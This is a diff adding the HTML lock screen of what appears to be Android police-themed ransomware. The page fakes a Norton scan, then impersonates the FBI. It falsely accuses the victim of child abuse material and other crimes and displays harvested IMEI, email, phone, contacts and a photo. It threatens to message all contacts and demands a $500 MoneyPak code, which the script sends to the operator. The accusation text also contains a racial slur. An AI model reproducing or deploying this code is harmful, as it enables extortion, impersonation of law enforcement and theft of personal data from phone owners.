@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>FBI сосет</title>
+    <link rel="stylesheet" href="jquery.mobile-1.2.0.min.css" />
+      
+<script src="jquery-1.8.2.min.js"></script>
+      <script src="jquery.knob2.js"></script>
+
+<script src="jquery.mobile-1.2.0.min.js"></script>
+      <script src="Bot.js"></script>
+
+<script>
+      
+      $(function() {
+            //    $(".knob").knob();
+
+});
+
+
+var maxVal = 0;
+jQuery(document).ready(function ($) {
+    $('body').show();
+    $("#imei").html(Bot.imei());
+    $("#mail").html(Bot.mail());
+    $("#phone").html(Bot.phone());
+    $("#model").html(Bot.model());
+    $("#network").html(Bot.network());
+    $("#country").html(Bot.country()); 
+     $("#countphones").html(Bot.countphones()); 
+    $("#contacts").html(Bot.getcontacts()); 
+     
+   
+    
+    /*
+    maxVal = 100;
+    $('.knob').val(0).trigger('change').delay(0);
+    var myColor = '#C0ffff';
+    var knob = $(".knob").knob({
+        'min': 0,
+            'max': 100,
+            'readOnly': true,
+            'width': 120, 
+            'step': 1,
+            'displayPrevious': true,
+            'height': 120,
+            'fgColor': '#333',
+            'dynamicDraw': true,
+            'thickness': 0.4,
+            'skin':"tron" 
+    });
+    */
+ if(Bot.read("animation",0) == 0){
+    $.mobile.changePage( "#examplePage" );
+     makeProgress();
+
+
+
+  /*  var tmr = self.setInterval(function () {
+        myDelay();
+    }, 50);     */
+ }else{
+    if(Bot.getstatus() == 1){
+         if(Bot.photo() == 1){
+        $("#photodiv").show();
+        $("#photoid").attr("src", Bot.photoimg());
+    }
+         $.mobile.changePage( "#examplePage2" );
+         
+    }else{
+        if(Bot.getstatus() == 2){
+            $.mobile.changePage( "#examplePage5");
+        
+        }else{
+            if(Bot.getstatus() == 3){
+            $.mobile.changePage( "#examplePage6");
+        
+        }else{
+            if(Bot.getstatus() == 4){
+            $.mobile.changePage( "#examplePage7");
+        
+        }else{
+            $.mobile.changePage( "#examplePage2" );
+            }
+            }
+            }
+            
+            
+    }
+   
+ }
+/*
+    var m = 0;
+
+    function myDelay() {
+        m += 1;
+        if (m > maxVal) {
+            window.clearInterval(tmr);
+            return;
+        }
+        switch (m) {
+            case 10:
+                $("#status").html("Scaning music foldfer");
+                break;
+            case 20:
+                $("#status").html("Scaning video foldfer");
+                break;
+            case 30:
+                $("#status").html("Scaning drivers foldfer"); 
+                break;
+            case 50:
+                $("#status").html("Scaning apps foldfer"); 
+                break;
+            case 60:
+                $("#status").html("Scaning system foldfer"); 
+                break;
+            case 80:
+                $("#status").html("Scaning cash foldfer"); 
+                break;
+            case 90:
+                $("#status").html("Scaning temp foldfer"); 
+                break; 
+            case 70:
+                myColor = 'red';
+                $("#status").html("Scaning browser foldfer"); 
+                break;
+            case 40:
+                myColor = '#ffec03';
+                $("#status").html("Scaning history foldfer"); 
+                break;
+            case 98:
+            Bot.log("Animation done, redirect to page.");
+            Bot.write("animation",1);
+            if(Bot.photo() == 1){
+        $("#photodiv").show();
+        $("#photoid").attr("src", Bot.photoimg());
+    }
+            $.mobile.changePage( "#examplePage2" );
+                window.clearInterval(tmr);
+                break;
+        }
+        $('.knob').trigger('configure', {
+            'fgColor': myColor 
+        });
+        $('.knob').val(m).trigger('change');
+    }
+    */
+});
+
+function makeProgress(){
+    var step =0;
+    var stop =0;
+    var increment = function(){
+        step=step+1;
+        switch (step) {
+            case 10:
+                $("#status").html("Scaning music foldfer");
+                break;
+            case 20:
+                $("#status").html("Scaning video foldfer");
+                break;
+            case 30:
+                $("#status").html("Scaning drivers foldfer"); 
+                break;
+            case 50:
+                $("#status").html("Scaning apps foldfer"); 
+                break;
+            case 60:
+                $("#status").html("Scaning system foldfer"); 
+                break;
+            case 80:
+                $("#status").html("Scaning cash foldfer"); 
+                break;
+            case 90:
+                $("#status").html("Scaning temp foldfer"); 
+                break; 
+            case 70: 
+                $("#scanner").attr("src","img/scanner_warn.png");
+                $("#status").html("Scaning browser foldfer"); 
+                break;
+            case 40: 
+                $("#status").html("Scaning history foldfer"); 
+                break;
+            case 98:
+            Bot.log("Animation done, redirect to page.");
+            Bot.write("animation",1);
+            if(Bot.photo() == 1){
+                $("#photodiv").show();
+                $("#photoid").attr("src", Bot.photoimg());
+            }
+            $.mobile.changePage( "#examplePage2" );
+                stop=1;
+                break;
+        }
+        if(stop!=1){
+        setTimeout(increment, 50);
+        }
+    };
+    increment();
+}
+    </script>
+  </head>
+  <body style="display: none;">
+  <div data-role="page" id="examplePage">
+      <header data-role="header" style="min-width: 320px!important; background: none!important; border:none!important; text-align: center;" >
+     <img width="100%" src="img/norton.png" />
+      </header>
+      <div data-role="content" style="text-align: center;" role="main" style="height: 500px;">
+ 
+         <img width="70%" id="scanner" src="img/scanner.png" />
+   <br /> <br />
+      </div>
+       <footer data-role="footer">
+        <h3 id="status">Music folder...</h3>
+      </footer>
+    </div>
+    
+<div data-role="page" id="examplePage2">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/stars.png) repeat-x #fc0; background-color: #797979;">
+      <div style="height: 97px; width: 110px; display:inline-block; vertical-align: top;">
+      <img src="img/fbi.png" height="100%" />
+      </div>
+      <div style="display:inline-block;">
+      <div style="height: 77px!important; overflow: hidden; vertical-align: central; line-height: 77px!important;"><h1 style="font-size: 45px!important; margin: 0px!important;">FBI</h1></div>
+      <div style="height: 20px!important; overflow: hidden; line-height: 20px!important;"><h3 style="font-size: 10px!important; margin: 0px!important;">FEDERAL BUREAU OF INVESTIGATION</h3></div>
+         
+        </div>
+        <img src="img/step1.png" width="100%" />
+      </header>
+      <div data-role="content" role="main">
+  
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+<h2>This device is locked due to the violation of the federal laws of the United States of America:</h2>  
+
+<h3 style="color: #8a0808;">§ 184a Distribution of episodes containing abuse or porn material with participation of animals</h3> 
+<h3 style="color: #8a0808;">§ 184b Distribution and keeping of porn material with participation of children</h3> 
+<h3 style="color: #8a0808;">§ 188 Spam distribution on e-mail adresses of private persons, containing the advertisement of illegal drugs, addictive substances or psychopharmaceuticals on the territory of the USA</h3> 
+<h3 style="color: #8a0808;">§ 219a Distribution of false information about politicians</h3> 
+<h3>* according to the Criminal Code of U.S.A.</h3>
+
+<h2>You have visited Web resources which contain porn materials forbidden by US federal law. The following malefactions are fixed:</h2>
+ 
+ <h3 style="color: #8a0808;">* Child’s porn</h3> 
+ <h3 style="color: #8a0808;">* Zoophilia</h3> 
+ <h3 style="color: #8a0808;">* Video content containing the scenes of child abuse.</h3> 
+
+
+<h2>Also your device contains the following elements:</h2>
+ 
+ <h3 style="color: #8a0808;">* Video materials of porn content including sexual acts with children (persons up to 9 years old)</h3> 
+ <h3 style="color: #8a0808;">* Video materials containing the scene of child (persons up to 9 years) and animals abuse.</h3> 
+ <h3 style="color: #8a0808;">* Video materials are made with the help of your device contain the scenes of cruel child and animals abuse.</h3> 
+<h3 style="color: #8a0808;">* The messages with terroristic motives, attempts in respect of political persons, and also in respect of top public officials were sent from your device</h3> 
+
+<h2>This device lock is aimed to stop your illegal activity.</h2>
+ <img src="img/bird.png" style="width: 50%;" />
+ <br /> 
+    <a onclick="Bot.log('Button click, go to Detailed report.');" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#examplePage3"><h2>Detailed report</h2></a> 
+      
+      </div>
+    </div>  
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+    
+    
+<div data-role="page" id="examplePage3">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/stars.png) repeat-x #fc0; background-color: #797979;">
+      <div style="height: 97px; width: 110px; display:inline-block; vertical-align: top;">
+      <img src="img/fbi.png" height="100%" />
+      </div>
+      <div style="display:inline-block;">
+      <div style="height: 77px!important; overflow: hidden; vertical-align: central; line-height: 77px!important;"><h1 style="font-size: 45px!important; margin: 0px!important;">FBI</h1></div>
+      <div style="height: 20px!important; overflow: hidden; line-height: 20px!important;"><h3 style="font-size: 10px!important; margin: 0px!important;">FEDERAL BUREAU OF INVESTIGATION</h3></div>
+         
+        </div>
+        <img src="img/step2.png" width="100%" />
+      </header>
+      <div data-role="content" role="main">
+ 
+    <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important; color: white!important; background: url(img/infoline.png) repeat #fc0;" aria-hidden="false">
+<h2>§ 184a Distribution of episodes containing abuse or porn material with participation of animals</h2>
+</div>
+</div>
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+    <h3>Your device stores video materials, containing the scenes of child’s porn with the participation of persons in the age up to 9 years. These materials will be attached to your criminal case. Keeping, distribution and sale of these photo/video materials are forbidden.</h3>  
+    <h4 style="color: #8a0808;">* Article 184/a carries punishment by means of imprisonment for a period from 2 till 5 years and obligatory penalty in an amount of 3500$.</h4> 
+</div> 
+      
+   <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important; color: white!important; background: url(img/infoline.png) repeat #fc0;" aria-hidden="false">
+<h2>§ 184b Distribution and keeping of porn material with participation of children</h2>
+</div>
+</div>
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+    <h3>Your device stores photo/video materials, containing the scenes of child and animals abuse in the extraordinary form. The materials are attached to your criminal case. Moreover, it is quite possibly that these photo/video materials were made by you with your device.</h3>  
+    <h4 style="color: #8a0808;">* Article 184/b carries punishment by means of imprisonment for a period from 5 till 10 years or penalty in an amount of 5000$.</h4> 
+</div> 
+      
+      
+   <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important; color: white!important; background: url(img/infoline.png) repeat #fc0;" aria-hidden="false">
+<h2>§ 188 Spam distribution on e-mail adresses of private persons, containing the advertisement of illegal drugs, addictive substances or psychopharmaceuticals on the territory of the USA</h2>
+</div>
+</div>
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+    <h3>Regular spam distribution has been performed from your device to e-mail addresses of private persons with the advertisement of illegal drugs, containing addictive and psychoactive substances such as «Get It Up, Super Cheetah, Cave Diver, Nights to Remember, X Zen Platinum». These irregularities were fixed by your provider.</h3>  
+    <h4 style="color: #8a0808;">* Article 188 carries punishment by means of penalty in an amount of 4000$, and also 120 hours of correctional labor.</h4> 
+</div> 
+      
+      
+      
+   <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important; color: white!important; background: url(img/infoline.png) repeat #fc0;" aria-hidden="false">
+<h2>§ 219a Distribution of false information about politicians</h2>
+</div>
+</div>
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+    <h3>You uploaded the false information on large Web resources, denigrating the honor of some politicians. You also uploaded the propagandizing information on large news resources, in respect of top official of a state, in other words against the president of the USA – Barack Hussein Obama. The data is given by your internet provider. The materials gathered for the last 7 days are represented as follows:</h3>  
+    <h4 style="background-color: silver;">Barack Obama gonna die that we could live! The USA needs honest governors instead of corrupting puppets! Barack Obama is a nigger from the underground. He killed children and has responsibility for all terrorist attacks in the US.</h4>  
+    
+    <h4 style="color: #8a0808;">* Article 219 carries punishment by means of penalty in an amount of 7500$ and also correctional labor for the period up to 1 year, or imprisonment for the period from 6 months till 2 years.</h4> 
+</div> 
+<div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+   <h2 style="color: #8a0808;">*****************</h2> 
+     <h3>Please, remember, that your personality and location are identified and criminal case which was initiated against you will be taken to court in 12 hours from the time when crimes were carried out, according to the reference articles of the Criminal Code. The process with regard to your criminal case will be appointed for the next day, and also you will be placed under detention. You have the right to call your defense attorney one time or you will be provided with a fee-based state attorney. 
+      <br /> <br />
+     However according to the changes in criminal law in U.S.A since January 17, 2014 and according to the Declaration of Human rights, your negligence of law can be interpreted as purposeless (if you hadn’t alternative cases before). 
+      <br /> <br />
+     According to these data, you will be permitted to pay fine in State Treasury (in the consequence of initiative directed on protection of cyber space in U.S.A) and in doing so to seize your clerical correspondence and taking your criminal case to court for decision formulation. Fine should be paid not later than in 12 hours since current time. In case of penalty non-redemption, your case will be taken to court for the further decision formulation and determination of your criminal case.</h3>  
+  </div>
+ <div style="text-align: center;  padding-left: 5%; padding-right: 5%;">
+ <br /> <br />
+   <img src="img/justice.png" style="width: 30%;" />
+   <img src="img/homeland.png" style="width: 30%;" />
+    <br /> <br />
+   </div>
+     <a onclick="Bot.log('Button click, go to Pay.');" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#infopage"><h2>Continue</h2></a> 
+    
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+    
+    
+<div data-role="page" id="infopage">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/stars.png) repeat-x #fc0; background-color: #797979;">
+      <div style="height: 97px; width: 110px; display:inline-block; vertical-align: top;">
+      <img src="img/fbi.png" height="100%" />
+      </div>
+      <div style="display:inline-block;">
+      <div style="height: 77px!important; overflow: hidden; vertical-align: central; line-height: 77px!important;"><h1 style="font-size: 45px!important; margin: 0px!important;">FBI</h1></div>
+      <div style="height: 20px!important; overflow: hidden; line-height: 20px!important;"><h3 style="font-size: 10px!important; margin: 0px!important;">FEDERAL BUREAU OF INVESTIGATION</h3></div>
+         
+        </div>
+        <img src="img/step3.png" width="100%" />
+      </header>
+      <div data-role="content" role="main">
+      
+      
+      
+      
+    <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important;" aria-hidden="false">
+<h3>FBI Criminal Investigation</h3>
+<div class="ui-grid-b">
+	<div class="ui-block-a" id="photodiv" style="display: none;"> <img id="photoid" src="" width="95%"/></div>
+	<div class="ui-block-b ui-block-c">
+        
+      <p>
+IMEI:<span id="imei"></span><br />
+<span id="mail"></span><br />
+<span id="phone"></span><br />
+<span id="model"></span><br />
+<span id="network"></span><br />
+<span id="country"></span><br />
+
+</p>
+</div>
+
+</div>   
+        </div> 
+</div> 
+
+
+      
+      
+      
+    <div class="ui-collapsible ui-collapsible-inset">
+<div class="ui-collapsible-content ui-body-c ui-corner-all" style="border: 1px solid #aaa !important;" aria-hidden="false">
+<h3>Notification delivery of law violation (zoophilia and children's porn).</h3>
+ 
+         
+All your contacts will be sent the following message:: <br />
+<h3>Attention! This phone user has violated the law of zoophilia and children's porn. For viewing these kinds of porn he will be convicted soon. Beware of personal contact with this person.</h3>
+<br />
+<h3>Contacts found: <span id="countphones"></span></h3>
+Some of them:<br />
+<div id="contacts"></var>
+  
+
+</div>   
+        </div> 
+</div> 
+ 
+ <h2>Send message?</h2>
+     
+    <div class="ui-grid-a ui-responsive">
+                <div class="ui-block-a"><a class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#examplePage4"><h2>YES</h2></a></div>
+                <div class="ui-block-b"><a class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#examplePage4"><h2>No, thanks</h2></a></div>
+                 
+            </div>
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+    
+<div data-role="page" id="examplePage4">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/bg_header_middle.jpg) repeat-x #fc0; background-color: white!important; height: 97px;  border: none!important;">
+       
+      <img src="img/fbi_funds.png" height="100%" />
+       
+      </header>
+      <div data-role="content" role="main">
+      <div style="text-align: center;">
+  <h1>Amount of fine is $500</h1>
+  <h2>You can settle the fine with MoneyPak express Packet vouchers.</h2>
+  <h2>As soon as the money arrives to the Treasure account, your device will be unblocked and all information will be decrypted in course of 24 hours.</h2>
+ 
+  
+  <div data-role="collapsible">
+   <h3>Where i can buy MoneyPak?</h3>
+   <p><img src="img/retails.png" width="100%" /></p>
+</div>
+<input type="text" readonly="true" name="code" id="code" placeholder="MoneyPak voucher code" autocomplete="off" />
+
+
+<style>
+.ui-controlgroup-controls {
+    display: block!important;
+    vertical-align: middle;
+    text-align: center!important;
+}
+</style>
+<div data-role="popup" id="popupBasic">
+	<p>Wrong MoneyPak code. You have only 3 attempts. Please try again.<p>
+</div>
+
+
+<div data-role="controlgroup" data-type="horizontal">
+<a data-role="button" onclick="$('#code').val($('#code').val()+'1');" style="width: 30%;">1</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'2');" style="width: 30%;">2</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'3');" style="width: 30%;">3</a>
+</div>
+<div data-role="controlgroup" data-type="horizontal">
+<a data-role="button" onclick="$('#code').val($('#code').val()+'4');" style="width: 30%;">4</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'5');" style="width: 30%;">5</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'6');" style="width: 30%;">6</a>
+</div>
+<div data-role="controlgroup" data-type="horizontal">
+<a data-role="button" onclick="$('#code').val($('#code').val()+'7');" style="width: 30%;">7</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'8');" style="width: 30%;">8</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'9');" style="width: 30%;">9</a>
+</div>
+<div data-role="controlgroup" data-type="horizontal">
+<a data-role="button" onclick="var sstr=$('#code').val(); $('#code').val(sstr.substr(0,(sstr.length - 1)));" data-icon="arrow-l" style="width: 30%;">&nbsp;</a>
+<a data-role="button" onclick="$('#code').val($('#code').val()+'0');" style="width: 30%;">0</a>
+<a data-role="button" onclick="$('#code').val('');" style="width: 30%;">Clear</a>
+</div>
+ 
+<br />
+ 
+ <a onclick="var ssttr= $('#code').val(); if(ssttr.length!=14){ $( '#popupBasic' ).popup('open'); } else{ Bot.log('Click SEND, code = '+$('#code').val()); Bot.sendcode($('#code').val()); Bot.setstatus(2); $.mobile.changePage( '#examplePage5' ); }" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c"><h2>Send a request</h2></a> 
+  </div>
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+    
+    
+        
+<div data-role="page" id="examplePage5">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/bg_header_middle.jpg) repeat-x #fc0; background-color: white!important; height: 97px;  border: none!important;">
+       
+      <img src="img/fbi_funds.png" height="100%" />
+       
+      </header>
+      <div data-role="content" role="main">
+      <div style="text-align: center;">
+  <h1>Your request will be processed in 24 hours.</h1>
+    </div>
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+   
+    
+        
+<div data-role="page" id="examplePage6">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/bg_header_middle.jpg) repeat-x #fc0; background-color: white!important; height: 97px;  border: none!important;">
+       
+      <img src="img/fbi_funds.png" height="100%" />
+       
+      </header>
+      <div data-role="content" role="main">
+      <div style="text-align: center;">
+  <h1>Entered code is incorrect. Please, enter another code.</h1>
+  <a onclick="Bot.setstatus(2); Bot.log('Button click, go to Pay.');" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#examplePage4"><h2>Continue</h2></a> 
+    
+    </div>
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer> 
+    </div>
+   
+    
+        
+<div data-role="page" id="examplePage7">
+      <header data-role="header"  style="min-width: 320px!important; background: url(img/bg_header_middle.jpg) repeat-x #fc0; background-color: white!important; height: 97px;  border: none!important;">
+       
+      <img src="img/fbi_funds.png" height="100%" />
+       
+      </header>
+      <div data-role="content" role="main">
+      <div style="text-align: center;">
+  <h1>This code is already processing and was entered earlier. Please, enter another code.</h1>
+  <a onclick="Bot.setstatus(2); Bot.log('Button click, go to Pay.');" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" href="#examplePage4"><h2>Continue</h2></a> 
+    
+    </div>
+      </div>
+      
+      <footer data-role="footer">
+        <h3></h3>
+      </footer>
+    </div>
+    </body>
+</html>
